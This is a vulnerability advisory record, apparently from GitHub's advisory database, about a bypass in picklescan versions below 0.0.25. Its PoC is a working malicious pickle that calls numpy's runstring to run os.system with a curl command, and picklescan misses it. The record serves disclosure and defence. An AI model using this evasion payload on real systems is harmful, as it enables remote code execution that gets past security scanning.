advisory_id: GHSA-fj43-3qmq-673f
datasource_id: github_osv_importer_v2/GHSA-fj43-3qmq-673f
datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/04/GHSA-fj43-3qmq-673f/GHSA-fj43-3qmq-673f.json
aliases: []
summary: "Picklescan failed to detect to some unsafe global function in Numpy library\n### Summary\n\
  An unsafe deserialization vulnerability in Python’s pickle module allows an attacker to bypass\
  \ static analysis tools like Picklescan and execute arbitrary code during deserialization.\
  \ This can be exploited by import some built-in function in Numpy library that indrectly call\
  \ some dangerous function like exec() to execute some python code as a parameter, which the\
  \ attacker can import dangerous library inside like os library and execute arbitrary OS commands.\n\
  ### Details\nPickle’s deserialization process is known to allow execution of function via\
  \ **reduce** method. While Picklescan is meant to detect such exploits, this attack evades\
  \ detection by calling function in Numpy library that call dangerous function like exec().\
  \ And since Numpy library wasn't inside unsafe globals blacklist, it may not raise red flag\
  \ in the security scan.\n\nThe attack payload executes in the following steps:\n- First, the\
  \ attacker craft the payload by import **runstring** function in **numpy.testing._private.utils**\n\
  - Then, inside **reduce** method, the attacker import dangerous libarary like os and calling\
  \ os.system() to run OS commands, for example: curl command. And then the attacker send this\
  \ malicious pickle file to the victim.\n- Then when the victim after checking whether the\
  \ pickle file is safe by using Picklescan library and this library doesn't dectect any dangerous\
  \ functions, decide to pickle.load() this malicious pickle file, thus lead to remote code\
  \ execution.\n\n### PoC\n```\nimport pickle\nimport torch\nimport pickle\nfrom picklescan.scanner\
  \ import scan_file_path\nclass Payload:\n  def __reduce__(self):\n    from numpy.testing._private.utils\
  \ import runstring\n    return runstring, (\"import os; os.system('curl https://example.com')\"\
  ,{})\n    \ndef create_payload():\n  with open('payload.pickle', 'wb') as f:\n    pickle.dump(Payload(),\
  \ f)\n\ndef load_payload():\n  result = scan_file_path('payload.pickle')\n  if result.infected_files\
  \ != 0 or result.scan_err:\n    print('File is infected')\n  else:\n    print('File is clean')\n\
  \    with open('payload.pickle', 'rb') as f:\n      pickle.load(f)\n\ncreate_payload() \n\
  load_payload()\n\n```\n\n### Impact\nSeverity: High\n\nWho is impacted? Any organization or\
  \ individual relying on picklescan to detect malicious pickle files inside PyTorch models.\
  \ For example, Invoke-AI repository (https://github.com/invoke-ai/InvokeAI)\nWhat is the impact?\
  \ Attackers can embed malicious code in pickle file that remains undetected but executes when\
  \ the pickle file is loaded.\nSupply Chain Attack: Attackers can distribute infected pickle\
  \ files across ML models, APIs, or saved Python objects.\n\n### Recommended Fixes:\n\nI suggest\
  \ adding Numpy library to the unsafe globals blacklist."
impacted_packages:
  - purl: pkg:pypi/picklescan
    affected_versions: vers:pypi/<0.0.25
    fixed_versions: vers:pypi/0.0.25
    fixed_in_commits: []
    introduced_in_commits: []
severities:
  - score: '5.3'
    scoring_system: cvssv4
    scoring_elements: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:P/VC:N/VI:L/VA:N/SC:N/SI:N/SA:N
    published_at: None
    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/04/GHSA-fj43-3qmq-673f/GHSA-fj43-3qmq-673f.json
  - score: MODERATE
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url:
weaknesses:
  - CWE-502
references:
  - url: https://github.com/mmaitre314/picklescan
    reference_type:
    reference_id:
  - url: https://github.com/mmaitre314/picklescan/security/advisories/GHSA-fj43-3qmq-673f
    reference_type:
    reference_id:
